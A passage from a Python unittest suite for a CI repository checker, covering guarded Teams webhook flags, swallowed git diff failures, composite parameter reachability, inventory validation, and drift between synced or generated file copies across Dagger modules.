        self.assertIn("fix/dast-evidence-write", result.stderr)

    def test_a_pending_repair_entry_does_not_excuse_it(self) -> None:
        """pin_guard.pending_repairs tolerates a pin that *lags*. A ref that is
        not a version does not lag — no bump makes it correct — so the
        tolerance must not reach it."""
        self._ref("fix/dast-evidence-write")
        self.fx.inventory.setdefault("pin_guard", {}).setdefault("pending_repairs", []).append(
            {"path": ".github/workflows/commit.yml", "reason": "not a real reason"}
        )
        self.assertTrue(check_cicd_refs_are_versions(self.fx.load()))


class GuardedFlagTests(FixtureTestCase):
    """A flag that switches on an optional outbound channel must be passed only
    when its value exists. cicd passed --teams-webhook unconditionally from
    commit.yml, precommit.yml and all four Azure DevOps templates: an unset
    GitHub secret still arrives as a non-nil, empty Secret under
    `secrets: inherit`, so every consumer who had never configured Teams POSTed
    a card to the empty string on every run, wrote `unsupported protocol scheme
    ""` into a twenty-minute log, and reported success.

    dast.yml carried the guard from the start, which is the whole point: the
    right shape existed in the same repository and nothing asked the other six
    surfaces to match it."""

    TEMPLATE = "templates/github-actions/commit.yml"
    WORKFLOW = ".github/workflows/commit.yml"
    GUARD = 'if [ -n "${TEAMS_WEBHOOK:-}" ]; then extra+=(--teams-webhook env:TEAMS_WEBHOOK); fi'

    def _rewrite(self, rel: str, replacement: str) -> None:
        body = self.fx.read(rel)
        self.assertIn(self.GUARD, body)
        self.fx.write(rel, body.replace(self.GUARD, replacement, 1))

    def test_the_baseline_guards_every_declared_flag(self) -> None:
        self.assertEqual([], check_guarded_flags(self.fx.load()))

    def test_a_flag_on_the_command_line_is_reported(self) -> None:
        """The exact defect: the flag as an unconditional argument."""
        self._rewrite(self.WORKFLOW, "")
        body = self.fx.read(self.WORKFLOW)
        self.fx.write(
            self.WORKFLOW,
            body.replace("call run --src . \\", "call run --src . \\\n            --teams-webhook env:TEAMS_WEBHOOK \\", 1),
        )
        problems = check_guarded_flags(self.fx.load())
        self.assertProblem(problems, self.WORKFLOW, "--teams-webhook", "on a command line")

    def test_an_unconditional_append_is_reported(self) -> None:
        """The array alone proves nothing — the conditional is the guard."""
        self._rewrite(self.WORKFLOW, "extra+=(--teams-webhook env:TEAMS_WEBHOOK)")
        problems = check_guarded_flags(self.fx.load())
        self.assertProblem(problems, self.WORKFLOW, "--teams-webhook", "no conditional testing TEAMS_WEBHOOK")

    def test_a_conditional_testing_the_wrong_variable_is_reported(self) -> None:
        """A guard has to name the value it is guarding, or a copy-pasted one
        from the neighbouring flag vouches for a variable nobody tested."""
        self._rewrite(
            self.WORKFLOW,
            'if [ -n "${NPM_FEED_TOKEN:-}" ]; then extra+=(--teams-webhook env:TEAMS_WEBHOOK); fi',
        )
        problems = check_guarded_flags(self.fx.load())
        self.assertProblem(problems, self.WORKFLOW, "no conditional testing TEAMS_WEBHOOK")

    def test_the_azure_devops_case_form_is_accepted(self) -> None:
        """ADO cannot use the one-liner: an undefined macro expands to its own
        literal text, so the guard excludes `$(` as well as the empty string."""
        self._rewrite(
            self.TEMPLATE,
            'case "${TEAMS_WEBHOOK:-}" in\n'
            "            ''|'$('*) ;;\n"
            "            *) extra+=(--teams-webhook env:TEAMS_WEBHOOK) ;;\n"
            "          esac",
        )
        self.assertEqual([], check_guarded_flags(self.fx.load()))

    def test_a_guard_further_away_than_the_lookback_is_reported(self) -> None:
        """Finite on purpose: a conditional a reader of the append cannot see
        is not one that reader can trust either."""
        filler = "".join(f"          echo line-{n}\n" for n in range(GUARD_LOOKBACK_LINES + 2))
        self._rewrite(
            self.WORKFLOW,
            'if [ -n "${TEAMS_WEBHOOK:-}" ]; then\n'
            + filler.rstrip("\n")
            + "\n            extra+=(--teams-webhook env:TEAMS_WEBHOOK)\n"
            "          fi",
        )
        problems = check_guarded_flags(self.fx.load())
        self.assertProblem(problems, self.WORKFLOW, "no conditional testing TEAMS_WEBHOOK")

    def test_a_flag_no_surface_passes_at_all_is_reported(self) -> None:
        """A declaration nothing exercises is a check that proves nothing — the
        same stale-exemption rule composite_reach carries."""
        self._rewrite(self.WORKFLOW, "")
        self._rewrite(self.TEMPLATE, "")
        problems = check_guarded_flags(self.fx.load())
        self.assertProblem(problems, "--teams-webhook", "no surface", "proves nothing")

    def test_an_empty_flag_list_is_refused(self) -> None:
        self.fx.inventory["guarded_flags"]["flags"] = []
        problems = check_guarded_flags(self.fx.load())
        self.assertProblem(problems, "flags is empty", "passes vacuously")

    def test_an_empty_surface_group_list_is_refused(self) -> None:
        self.fx.inventory["guarded_flags"]["surface_groups"] = []
        problems = check_guarded_flags(self.fx.load())
        self.assertProblem(problems, "surface_groups is empty", "passes vacuously")

    def test_a_surface_group_that_does_not_exist_is_refused(self) -> None:
        self.fx.inventory["guarded_flags"]["surface_groups"] = ["starter_kits"]
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("not an active_surfaces group", str(ctx.exception))

    def test_a_flag_without_a_reason_is_refused(self) -> None:
        self.fx.inventory["guarded_flags"]["flags"].append(
            {"flag": "example-api-key", "variable": "EXAMPLE_API_KEY"}
        )
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("a guard nobody wrote a reason for", str(ctx.exception))

class SwallowedChangeDiffTests(FixtureTestCase):
    """A `git diff` that feeds the change scope must not have its failure
    discarded. Seven surfaces wrote `git diff … || : > "$out"`: a shallow
    checkout or an unfetched base left an empty diff, intent read it as a change
    touching nothing in scope and audited the whole tree instead, and a pull
    request carrying no artifact passed on the artifacts already on main."""

    WORKFLOW = ".github/workflows/commit.yml"
    ANCHOR = "          extra=()\n"

    def _insert(self, script: str) -> None:
        body = self.fx.read(self.WORKFLOW)
        self.assertIn(self.ANCHOR, body)
        self.fx.write(self.WORKFLOW, body.replace(self.ANCHOR, script + self.ANCHOR, 1))

    def test_the_baseline_swallows_nothing(self) -> None:
        self.assertEqual([], check_change_diff_not_swallowed(self.fx.load()))

    def test_the_shipped_shape_is_reported(self) -> None:
        """The exact line precommit.yml carried before the fix."""
        self._insert(
            '          git diff --no-color --no-ext-diff --src-prefix=a/ --dst-prefix=b/ '
            '"origin/$base"...HEAD > "$out" 2>/dev/null || : > "$out"\n'
        )
        problems = check_change_diff_not_swallowed(self.fx.load())
        self.assertProblem(problems, self.WORKFLOW, "exit status of `git diff`", "whole-tree audit")

    def test_or_true_across_a_continuation_is_reported(self) -> None:
        """Split over two physical lines it is still one command."""
        self._insert(
            '          git diff --no-color "$range" -- > "$out" \\\n'
            "            || true\n"
        )
        problems = check_change_diff_not_swallowed(self.fx.load())
        self.assertProblem(problems, self.WORKFLOW, "exit status of `git diff`")

    def test_a_handler_that_fails_is_accepted(self) -> None:
        self._insert('          git diff --no-color "$range" -- > "$out" || { rm -f -- "$out"; exit 1; }\n')
        self.assertEqual([], check_change_diff_not_swallowed(self.fx.load()))

    def test_a_comment_quoting_the_old_shape_is_not_a_command(self) -> None:
        self._insert('          # used to be: git diff "$range" > "$out" || : > "$out"\n')
        self.assertEqual([], check_change_diff_not_swallowed(self.fx.load()))

    def test_or_true_on_an_unrelated_command_is_not_reported(self) -> None:
        self._insert('          git fetch --no-tags origin main || true\n')
        self.assertEqual([], check_change_diff_not_swallowed(self.fx.load()))


class CompositeReachTests(FixtureTestCase):
    """A knob nobody can reach and a knob nobody needs look identical from
    outside. `.github/workflows/commit.yml` shipped for five releases exposing
    no licence policy input at all, while `precommit.yml` exposed three: no
    check asked whether a composite parameter was reachable from the surfaces a
    consumer actually configures, so the drift was invisible to everything but
    the consumer who hit it.

    The exemption list is the interesting half. Most composite parameters are
    legitimately unreachable today, so a check with no escape hatch would be
    turned off within a week; a written reason keeps each one a decision. A
    stale exemption is therefore reported too, or the list slowly becomes a
    second, quieter place for a knob to go missing."""

    TEMPLATE = "templates/github-actions/commit.yml"
    WORKFLOW = ".github/workflows/commit.yml"
    FORWARDED = '--license-gate "$LICENSE_GATE"'

    def _param(self, decl: str) -> None:
        """Give the fixture composite one more entry-function parameter."""
        self.fx.write(
            "src/composites/commit/main.go",
            COMMIT_MAIN_GO.replace(
                "\tlicenseGate string,\n", "\tlicenseGate string,\n\t" + decl + ",\n"
            ),
        )

    def _forward(self, rel: str, text: str) -> None:
        body = self.fx.read(rel)
        self.assertIn(self.FORWARDED, body)
        self.fx.write(rel, body.replace(self.FORWARDED, self.FORWARDED + " " + text, 1))

    def _excuse(self, param: str, site: str, reason: str = "not wired yet") -> None:
        self.fx.inventory["composite_reach"]["unreachable"].append(
            {"param": param, "sites": [site], "reason": reason}
        )

    def test_the_baseline_reaches_every_parameter(self) -> None:
        self.assertEqual([], check_composite_params_reachable(self.fx.load()))

    def test_a_parameter_no_starter_surface_names_is_reported(self) -> None:
        self._param("licenseAllow []string")
        self._forward(self.WORKFLOW, "--license-allow MIT")
        problems = check_composite_params_reachable(self.fx.load())
        self.assertProblem(problems, self.TEMPLATE, "--license-allow", "cannot reach it")

    def test_a_reasoned_exemption_clears_the_gap(self) -> None:
        self._param("licenseAllow []string")
        self._forward(self.WORKFLOW, "--license-allow MIT")
        self._excuse("license-allow", self.TEMPLATE, "the starter shows the default policy")
        self.assertEqual([], check_composite_params_reachable(self.fx.load()))

    def test_an_exemption_for_a_parameter_now_reached_is_reported(self) -> None:
        self._excuse("license-gate", self.TEMPLATE, "was unwired before the licence-policy work")
        problems = check_composite_params_reachable(self.fx.load())
        self.assertProblem(problems, "--license-gate", self.TEMPLATE, "remove the entry")

    def test_a_flag_named_only_in_a_comment_does_not_count(self) -> None:
        """Prose is not a flag. The first version of this check read `--include`
        out of a comment reading "one flag per entry, like --include" and called
        a template that forwards nothing compliant — the same lesson
        check_cross_module_develop learned from the other side."""
        self._param("licenseAllow []string")
        self._forward(self.WORKFLOW, "--license-allow MIT")
        body = self.fx.read(self.TEMPLATE)
        self.fx.write(
            self.TEMPLATE,
            body + "          # Pass --license-allow here once the policy is agreed.\n",
        )
        problems = check_composite_params_reachable(self.fx.load())
        self.assertProblem(problems, self.TEMPLATE, "--license-allow")

    def test_a_composite_call_this_check_cannot_resolve_must_be_declared(self) -> None:
        self.fx.write(
            self.TEMPLATE,
            "jobs:\n  commit:\n    steps:\n      - run: |\n"
            '          MOD="src/composites/commit"\n'
            '          dagger -m "$MOD" call run --src .\n',
        )
        problems = check_composite_params_reachable(self.fx.load())
        self.assertProblem(problems, self.TEMPLATE, "unreadable_sites")

    def test_an_unreadable_declaration_for_a_site_that_resolves_is_reported(self) -> None:
        self.fx.inventory["composite_reach"]["unreadable_sites"].append(
            {"path": self.TEMPLATE, "reason": "builds its module reference in a variable"}
        )
        problems = check_composite_params_reachable(self.fx.load())
        self.assertProblem(problems, self.TEMPLATE, "remove the entry")

    def test_a_one_line_signature_is_refused_rather_than_read_as_agreement(self) -> None:
        """A reformatted signature must not silently make every parameter
        reachable. The parser answers "I cannot read this", which is a problem;
        an empty parameter list would have been a pass."""
        self.fx.write(
            "src/composites/commit/main.go",
            "package main\n\ntype Commit struct{}\n\n"
            "func (m *Commit) Run(ctx context.Context, src *dagger.Directory) error {\n"
            "\treturn nil\n}\n",
        )
        problems = check_composite_params_reachable(self.fx.load())
        self.assertTrue(problems)
        self.assertTrue(
            all("no multi-line" in problem for problem in problems), problems
        )

    def test_a_signature_that_parses_to_nothing_is_refused(self) -> None:
        self.fx.write(
            "src/composites/commit/main.go",
            "package main\n\ntype Commit struct{}\n\n"
            "func (m *Commit) Run(\n) error {\n\treturn nil\n}\n",
        )
        problems = check_composite_params_reachable(self.fx.load())
        self.assertTrue(problems)
        self.assertTrue(
            all("vacuity" in problem for problem in problems), problems
        )

    def test_an_empty_surface_group_list_is_refused(self) -> None:
        self.fx.inventory["composite_reach"]["surface_groups"] = []
        problems = check_composite_params_reachable(self.fx.load())
        self.assertProblem(problems, "surface_groups is empty", "passes vacuously")

    def test_a_surface_group_that_does_not_exist_is_refused(self) -> None:
        self.fx.inventory["composite_reach"]["surface_groups"] = ["starter_kits"]
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("not an active_surfaces group", str(ctx.exception))

    def test_an_exemption_without_a_reason_is_refused(self) -> None:
        self.fx.inventory["composite_reach"]["unreachable"].append(
            {"param": "license-allow", "sites": [self.TEMPLATE]}
        )
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("admitted explicitly, never by omission", str(ctx.exception))

    def test_an_exemption_naming_no_site_is_refused(self) -> None:
        self.fx.inventory["composite_reach"]["unreachable"].append(
            {"param": "license-allow", "sites": [], "reason": "everywhere, apparently"}
        )
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("non-empty 'sites'", str(ctx.exception))

    def test_an_unreadable_site_without_a_reason_is_refused(self) -> None:
        self.fx.inventory["composite_reach"]["unreadable_sites"].append(
            {"path": self.TEMPLATE}
        )
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("named, not skipped", str(ctx.exception))

    def test_the_flag_name_matches_daggers_own_mangling(self) -> None:
        self.assertEqual("license-allow", dagger_flag_name("licenseAllow"))
        self.assertEqual("src", dagger_flag_name("src"))
        self.assertEqual("npm-feed-a-p-i-key", dagger_flag_name("npmFeedAPIKey"))


class InventoryValidationTests(FixtureTestCase):
    """An inventory that proves nothing must be refused, not quietly satisfied."""

    def test_empty_module_list_is_refused(self) -> None:
        self.fx.inventory["modules"] = []
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("'modules' is empty", str(ctx.exception))

    def test_inventory_with_no_active_surface_is_refused(self) -> None:
        self.fx.inventory["active_surfaces"] = {"root_instructions": [], "module_docs": []}
        self.fx.inventory["pin_rewrite"] = {
            "default_scope_groups": ["root_instructions"],
            "workflow_scope_groups": ["module_docs"],
        }
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("declares no active surface", str(ctx.exception))

    def test_empty_inventory_makes_the_cli_fail(self) -> None:
        self.fx.inventory["modules"] = []
        result = self.fx.run_cli()
        self.assertEqual(2, result.returncode, result.stdout)
        self.assertIn("'modules' is empty", result.stderr)

    def test_missing_inventory_file_is_refused(self) -> None:
        with self.assertRaises(InventoryError) as ctx:
            load_inventory(self.fx.root / "scripts" / "absent.json", self.fx.root)
        self.assertIn("not found", str(ctx.exception))

    def test_malformed_inventory_is_refused(self) -> None:
        path = self.fx.root / "scripts" / "broken.json"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("{ not json")
        with self.assertRaises(InventoryError) as ctx:
            load_inventory(path, self.fx.root)
        self.assertIn("not valid JSON", str(ctx.exception))

    def test_historical_exclusion_without_a_reason_is_refused(self) -> None:
        self.fx.inventory["historical_exclusions"].append({"path": "docs/how-to-guides"})
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("needs a 'reason'", str(ctx.exception))

    def test_pin_rewrite_naming_an_unknown_group_is_refused(self) -> None:
        self.fx.inventory["pin_rewrite"]["default_scope_groups"].append("nonexistent_group")
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("unknown surface group", str(ctx.exception))

    def test_group_in_both_pin_scopes_is_refused(self) -> None:
        self.fx.inventory["pin_rewrite"]["workflow_scope_groups"].append("templates")
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("in both scopes", str(ctx.exception))

    def test_pin_rewrite_scopes_partition_the_declared_surfaces(self) -> None:
        inv = self.fx.load()
        default, workflow = inv.pin_rewrite_default_targets, inv.pin_rewrite_workflow_targets
        self.assertEqual(
            (".github/workflows/commit.yml", ".github/workflows/dogfood.yml"), workflow
        )
        self.assertEqual(set(), set(default) & set(workflow))
        self.assertTrue(set(default) | set(workflow) <= set(inv.active_surfaces))



class SyncedFileTests(FixtureTestCase):
    """scenario: a copied file drifting from its twin.

    Dagger modules cannot import each other, so a helper two modules both need is
    shared by copying it. schema.go has a generator; these copies do not, which is
    why the equality is asserted rather than assumed — markers.go is the same
    pattern left unchecked, and `.slnx` went missing from two of its three copies
    for exactly as long as nothing tested the pair together.
    """

    REASON = "NuGet feed transport check and NuGet.Config rendering"

    def _declare(self, *paths: str) -> None:
        self.fx.inventory["synced_files"] = [{"reason": self.REASON, "paths": list(paths)}]

    def test_identical_copies_pass(self) -> None:
        self.fx.write("src/quality/nugetfeed.go", "package main\n\nconst a = 1\n")
        self.fx.write("src/security/nugetfeed.go", "package main\n\nconst a = 1\n")
        self._declare("src/quality/nugetfeed.go", "src/security/nugetfeed.go")
        self.assertEqual([], check_synced_files(self.fx.load()))

    def test_drifted_copy_is_named_with_the_fix(self) -> None:
        """One byte of drift, which is all it takes.

        The failure this guards is not cosmetic: these copies decide whether a
        feed token may go on the wire at all. A copy that drifts on the transport
        check sends a credential in cleartext from one module and refuses it from
        the other, and nothing in the passing module's evidence would say so.
        """
        self.fx.write("src/quality/nugetfeed.go", "package main\n\nconst a = 1\n")
        self.fx.write("src/security/nugetfeed.go", "package main\n\nconst a = 2\n")
        self._declare("src/quality/nugetfeed.go", "src/security/nugetfeed.go")
        problems = check_synced_files(self.fx.load())
        self.assertProblem(
            problems,
            "byte-identical",
            "src/quality/nugetfeed.go",
            "src/security/nugetfeed.go",
            self.REASON,
        )

    def test_missing_copy_is_a_problem_not_a_skip(self) -> None:
        """A group that shrinks to one file passes every comparison left to make.

        `if not path.exists(): continue` is how the inventory's other checks used
        to lose a surface, so the same shape is refused here.
        """
        self.fx.write("src/quality/nugetfeed.go", "package main\n")
        self._declare("src/quality/nugetfeed.go", "src/security/nugetfeed.go")
        problems = check_synced_files(self.fx.load())
        self.assertProblem(problems, "src/security/nugetfeed.go", "not a file")

    def test_group_without_a_reason_is_refused(self) -> None:
        """A copy nobody wrote down a reason for is a copy nobody will keep."""
        self.fx.write("src/quality/nugetfeed.go", "package main\n")
        self.fx.write("src/security/nugetfeed.go", "package main\n")
        self.fx.inventory["synced_files"] = [
            {"paths": ["src/quality/nugetfeed.go", "src/security/nugetfeed.go"]}
        ]
        with self.assertRaises(InventoryError):
            self.fx.load()

    def test_group_of_one_is_refused(self) -> None:
        """Nothing to compare is not the same as nothing wrong."""
        self.fx.write("src/quality/nugetfeed.go", "package main\n")
        self.fx.inventory["synced_files"] = [
            {"reason": self.REASON, "paths": ["src/quality/nugetfeed.go"]}
        ]
        with self.assertRaises(InventoryError):
            self.fx.load()

    SDK_TAIL = 'package main\n\nimport "{mod}/internal/dagger"\n\nvar _ = dagger.File{{}}\n'

    def _declare_sdk_pair(self, commit_import: str, dast_import: str, *, allow: bool = True) -> None:
        self.fx.write("src/composites/commit/go.mod", "module dagger/commit\n\ngo 1.26.2\n")
        self.fx.write("src/composites/dast/go.mod", "module dagger/dast\n\ngo 1.26.2\n")
        self.fx.write("src/composites/commit/audittail.go", self.SDK_TAIL.format(mod=commit_import))
        self.fx.write("src/composites/dast/audittail.go", self.SDK_TAIL.format(mod=dast_import))
        entry = {"reason": self.REASON,
                 "paths": ["src/composites/commit/audittail.go", "src/composites/dast/audittail.go"]}
        if allow:
            entry["may_differ_by"] = "module-sdk-import"
        self.fx.inventory["synced_files"] = [entry]

    def test_each_module_may_import_its_own_sdk(self) -> None:
        """A helper taking a *dagger.File differs by exactly one line per module.

        Each module's SDK lives at "<go.mod module>/internal/dagger", so without
        the declared allowance no Dagger-typed helper could be shared at all, and
        the audit tail stayed three hand-kept copies for that reason alone.
        """
        self._declare_sdk_pair("dagger/commit", "dagger/dast")
        self.assertEqual([], check_synced_files(self.fx.load()))

    def test_the_sdk_allowance_must_be_declared(self) -> None:
        self._declare_sdk_pair("dagger/commit", "dagger/dast", allow=False)
        self.assertProblem(check_synced_files(self.fx.load()), "byte-identical")

    def test_a_copy_importing_another_modules_sdk_still_drifts(self) -> None:
        """Only each copy's *own* import is allowed, read from its own go.mod.

        A normaliser that blanked any `dagger/<x>/internal/dagger` would pass a
        copy pasted in from a sibling unchanged; the compiler would catch that
        one, but the allowance must not be the reason nothing else does.
        """
        self._declare_sdk_pair("dagger/commit", "dagger/commit")
        self.assertProblem(
            check_synced_files(self.fx.load()),
            "apart from each module's own SDK import",
            "put back that copy's own SDK import",
        )

    def test_logic_drift_beside_an_allowed_import_is_named(self) -> None:
        self._declare_sdk_pair("dagger/commit", "dagger/dast")
        self.fx.write(
            "src/composites/dast/audittail.go",
            self.SDK_TAIL.format(mod="dagger/dast") + "\nconst drift = 1\n",
        )
        self.assertProblem(check_synced_files(self.fx.load()), "byte-identical", self.REASON)

    def test_sdk_allowance_without_a_go_mod_is_a_problem(self) -> None:
        self._declare_sdk_pair("dagger/commit", "dagger/dast")
        (self.fx.root / "src/composites/dast/go.mod").unlink()
        self.assertProblem(check_synced_files(self.fx.load()), "src/composites/dast/audittail.go", "no go.mod")

    def test_an_undeclared_difference_is_refused(self) -> None:
        """The allowance is a closed vocabulary: anything else is not a copy."""
        self._declare_sdk_pair("dagger/commit", "dagger/dast")
        self.fx.inventory["synced_files"][0]["may_differ_by"] = "whitespace"
        with self.assertRaises(InventoryError):
            self.fx.load()

    def test_drift_makes_the_cli_fail(self) -> None:
        self.fx.write("src/quality/nugetfeed.go", "package main\n\nconst a = 1\n")
        self.fx.write("src/security/nugetfeed.go", "package main\n\nconst a = 2\n")
        self._declare("src/quality/nugetfeed.go", "src/security/nugetfeed.go")
        result = self.fx.run_cli()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("byte-identical", result.stderr)

class GeneratedFileTests(FixtureTestCase):
    """scenario: a generated copy drifting from the implementation it copies.

    This is SyncedFileTests' blind spot rather than a second helping of it. A
    copy-vs-copy comparison can only see copies disagreeing with each other, and
    the failure that actually happens is both copies agreeing with each other and
    disagreeing with the canonical file — which is what happens every time
    somebody edits the canonical file and forgets the copies.
    """

    REASON = "the ADR-004 toolchain resolver"
    GENERATOR = "scripts/gen.py"
    SOURCE = "src/internal/detect/toolchain.go"

    def _write_generator(self, body: str = "") -> None:
        """A stand-in generator: prefix the source with a package clause.

        Deliberately trivial. What is under test is the comparison, not the real
        transform — and a fixture that reimplemented sync-toolchain.py would pass
        by agreeing with itself.
        """
        self.fx.write(self.GENERATOR, (
            "import sys\n"
            "src = open(sys.argv[1]).read()\n"
            f"{body}"
            "sys.stdout.write('package main\\n' + src)\n"
        ))

    def _declare(self, *paths: str) -> None:
        self.fx.inventory["generated_files"] = [{
            "reason": self.REASON,
            "generator": self.GENERATOR,
            "source": self.SOURCE,
            "paths": list(paths),
        }]

    def test_copy_matching_the_generator_passes(self) -> None:
        self._write_generator()
        self.fx.write(self.SOURCE, "const a = 1\n")
        self.fx.write("src/quality/toolchain.go", "package main\nconst a = 1\n")
        self._declare("src/quality/toolchain.go")
        self.assertEqual([], check_generated_files(self.fx.load()))

    def test_stale_copy_is_named_with_the_fix(self) -> None:
        self._write_generator()
        self.fx.write(self.SOURCE, "const a = 2\n")
        self.fx.write("src/quality/toolchain.go", "package main\nconst a = 1\n")
        self._declare("src/quality/toolchain.go")
        problems = check_generated_files(self.fx.load())
        self.assertProblem(problems, "src/quality/toolchain.go", self.GENERATOR, self.REASON)

    def test_copies_identical_to_each_other_and_stale_are_still_caught(self) -> None:
        """The case that motivates the check existing at all.

        Both copies agree, so every byte comparison between them passes; both
        disagree with the canonical file, so both are wrong. Measured on the real
        tree: appending one line to src/internal/detect/toolchain.go left the two
        module copies with the identical md5 and this check flagged both.
        """
        self._write_generator()
        self.fx.write(self.SOURCE, "const a = 2\n")
        self.fx.write("src/quality/toolchain.go", "package main\nconst a = 1\n")
        self.fx.write("src/build/toolchain.go", "package main\nconst a = 1\n")
        self._declare("src/quality/toolchain.go", "src/build/toolchain.go")

        # The premise: a copy-vs-copy check has nothing to report here.
        self.assertEqual(
            (self.fx.root / "src/quality/toolchain.go").read_bytes(),
            (self.fx.root / "src/build/toolchain.go").read_bytes(),
        )
        problems = check_generated_files(self.fx.load())
        self.assertEqual(2, len(problems), problems)

    def test_missing_copy_is_a_problem_not_a_skip(self) -> None:
        self._write_generator()
        self.fx.write(self.SOURCE, "const a = 1\n")
        self._declare("src/quality/toolchain.go")
        problems = check_generated_files(self.fx.load())
        self.assertProblem(problems, "src/quality/toolchain.go", "not a file")

    def test_absent_generator_is_a_problem_not_a_skip(self) -> None:
        """A generator that is not there defends nothing, silently."""
        self.fx.write(self.SOURCE, "const a = 1\n")
        self.fx.write("src/quality/toolchain.go", "package main\nconst a = 1\n")
        self._declare("src/quality/toolchain.go")
        problems = check_generated_files(self.fx.load())
        self.assertProblem(problems, self.GENERATOR, "checked by nothing")

    def test_absent_source_is_a_problem_not_a_skip(self) -> None:
        self._write_generator()
        self.fx.write("src/quality/toolchain.go", "package main\nconst a = 1\n")
        self._declare("src/quality/toolchain.go")
        problems = check_generated_files(self.fx.load())
        self.assertProblem(problems, self.SOURCE, "checked by nothing")

    def test_generator_that_crashes_is_a_problem_not_a_pass(self) -> None:
        """The founding doctrine, applied to the check's own tooling.

        A generator that exits non-zero produced nothing to compare, and
        reporting that as agreement is the same lie as a scanner that could not
        run reporting zero findings.
        """
        self._write_generator(body="raise SystemExit('boom')\n")
        self.fx.write(self.SOURCE, "const a = 1\n")
        self.fx.write("src/quality/toolchain.go", "package main\nconst a = 1\n")
        self._declare("src/quality/toolchain.go")
        problems = check_generated_files(self.fx.load())
        self.assertProblem(problems, self.GENERATOR, "nothing was compared")

    def test_entry_without_a_reason_is_refused(self) -> None:
        self._write_generator()
        self.fx.write(self.SOURCE, "const a = 1\n")
        self.fx.inventory["generated_files"] = [{
            "generator": self.GENERATOR,
            "source": self.SOURCE,
            "paths": ["src/quality/toolchain.go"],
        }]
        with self.assertRaises(InventoryError):
            self.fx.load()

    def test_entry_without_paths_is_refused(self) -> None:
        """A group with nothing in it passes every comparison left to make."""
        self._write_generator()
        self.fx.write(self.SOURCE, "const a = 1\n")
        self.fx.inventory["generated_files"] = [{
            "reason": self.REASON,
            "generator": self.GENERATOR,
            "source": self.SOURCE,
            "paths": [],
        }]
        with self.assertRaises(InventoryError):
            self.fx.load()

    def test_drift_makes_the_cli_fail(self) -> None:
        self._write_generator()
        self.fx.write(self.SOURCE, "const a = 2\n")
        self.fx.write("src/quality/toolchain.go", "package main\nconst a = 1\n")
        self._declare("src/quality/toolchain.go")
        result = self.fx.run_cli()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("scripts/gen.py", result.stderr)


class ShippedInventoryTests(unittest.TestCase):
    """The manifest this repository ships must be real, not a stub.

    Deliberately narrow: these assert the inventory is loadable, complete and
    non-vacuous. They do NOT assert the whole tree is clean — repairing the
    remaining active drift is a separate, separately reviewable change.
    """

    @classmethod
    def setUpClass(cls) -> None:
        cls.inv = load_inventory()

    def test_declares_the_nugetfeed_copies_as_synced(self) -> None:
        """The one group that exists today, asserted so deleting it is deliberate.

        src/quality/nugetfeed.go and src/security/nugetfeed.go are the same file
        because Dagger modules cannot import each other, and they decide whether a
        feed token goes on the wire. Dropping the declaration would leave two
        copies free to disagree with nothing reporting it.
        """
        groups = [set(paths) for _, paths, _ in self.inv.synced_files]
        self.assertIn(
            {"src/quality/nugetfeed.go", "src/security/nugetfeed.go"},
            [set(g) for g in groups],
            "the nugetfeed.go copies are no longer declared as synced",
        )

    def test_declares_every_module_found_on_disk(self) -> None:
        discovered = sorted(
            marker.parent.relative_to(REPO_ROOT).as_posix()
            for marker in (REPO_ROOT / "src").rglob("dagger.json")
        )
        self.assertEqual(discovered, sorted(self.inv.modules))

    def test_declares_no_path_that_is_missing(self) -> None:
        self.assertEqual([], check_declared_paths_exist(self.inv))

    def test_module_inventory_agrees_with_discovery(self) -> None:
        self.assertEqual([], check_module_inventory(self.inv))

    def test_release_workflows_defend_manifest_before_consuming_it(self) -> None:
        """Both release paths must reject a discovered-but-unlisted module
        before their inventory-driven module loops can omit it."""
        for relative in (".github/workflows/cd.yml", ".github/workflows/release.yml"):
            text = (REPO_ROOT / relative).read_text()
            guard = text.index("python3 scripts/check-repo-surface.py --modules")
            consume = text.index("python3 scripts/inventory-query.py modules")
            self.assertLess(guard, consume, relative)

    def test_ci_validates_every_declared_module(self) -> None:
        """`module-test`'s matrix is the last copied module list left in CI.

        Four modules are deliberately absent from it because dedicated jobs
        exercise them end to end instead (composites via the composite smokes,
        contract via verify-contracts). That is fine — but it must be an
        asserted claim, not an assumption: a 17th module added to the inventory
        and forgotten here would otherwise be released with no Dagger
        validation at all, which is exactly the "all modules" omission this
        series exists to make impossible.
        """
        ci = (REPO_ROOT / ".github" / "workflows" / "ci.yml").read_text()
        matrix = _ci_matrix_modules(ci)
        jobs = _ci_jobs(ci)

        # Every matrix entry must still be a declared module.
        self.assertEqual([], [m for m in matrix if m not in self.inv.modules], matrix)

        # Modules validated by a dedicated job instead of the matrix. The job
        # must exist and must actually reference the module.
        covered_elsewhere = {
            "src/composites/commit": "composite-smoke-commit",
            "src/composites/dast": "composite-smoke-dast",
            "src/composites/precommit": "composite-smoke",
            "src/cross-cutting/contract": "verify-contracts",
        }
        for module, job in covered_elsewhere.items():
            self.assertIn(job, jobs, f"{module} claims coverage by a job that no longer exists")
            self.assertIn(module, jobs[job], f"job {job} no longer references {module}")

        unvalidated = [
            m for m in self.inv.modules if m not in matrix and m not in covered_elsewhere
        ]
        self.assertEqual(
            [],
            unvalidated,
            "declared module(s) validated by no CI job: add them to the "
            "module-test matrix in .github/workflows/ci.yml (and give them a "
            "fixture case), or record the dedicated job that covers them here",
        )

    def test_every_workflow_action_can_start_a_run(self) -> None:
        self.assertEqual([], check_workflow_actions_trusted(self.inv))

    def test_reusable_workflow_outputs_resolve(self) -> None:
        """The shipped chains (commit.yml, precommit.yml) must resolve end to
        end — and both files must actually be in the checked scope, or a green
        result here is the vacuous pass the checker exists to refuse."""
        self.assertEqual([], check_workflow_output_chain(self.inv))
